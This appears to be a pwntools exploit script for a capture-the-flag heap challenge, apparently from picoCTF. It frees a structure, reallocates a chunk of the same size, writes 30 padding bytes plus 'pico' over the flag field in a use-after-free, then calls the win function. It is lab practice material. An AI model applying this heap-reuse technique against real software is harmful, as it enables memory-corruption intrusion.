from pwn import (
    args,
    gdb,
    remote,
    process,
    p64,
    u64,
    flat,
    ROP,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./chall"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
# context.terminal = "kitty"

io = start()

offset = 30  # to reach x.flag

# Free
io.sendline(b"5")

# Allocate memory with same size as x
io.sendline(b"2")
io.sendline(b"35")
io.sendline(b"a" * offset + b"pico")

# call win
io.sendline(b"4")
io.interactive()
